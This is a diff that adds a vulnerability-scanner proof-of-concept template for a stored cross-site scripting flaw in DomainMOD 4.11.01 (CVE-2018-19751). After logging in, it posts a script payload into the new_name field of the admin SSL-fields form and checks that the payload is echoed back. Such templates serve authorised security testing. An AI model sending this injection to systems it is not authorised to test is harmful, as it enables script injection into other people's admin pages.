@@ -1,0 +1,70 @@
+[info]
+author = "ave"
+description = "通过登录 DomainMOD 管理后台后，向 /admin/ssl-fields/add.php 的 new_name 参数注入 XSS payload，然后在 /admin/ssl-fields/ 页面验证 payload 是否被回显执行，检测存储型 XSS 漏洞。"
+id = "POC-AVE-2018-0152"
+name = "DomainMOD 4.11.01 跨站脚本漏洞 PoC"
+severity = "medium"
+tags = ["ave-2018-0152"]
+vuln_id = [
+    "CVE-2018-19751",
+    "AVE-2018-0152",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_username={{username}}&new_password={{password}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admin/ssl-fields/add.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_field_name=new&new_field_type_id=1&new_description=test&new_notes=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/admin/ssl-fields/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"><script>alert(document.domain)</script></a>']
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["text/html"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
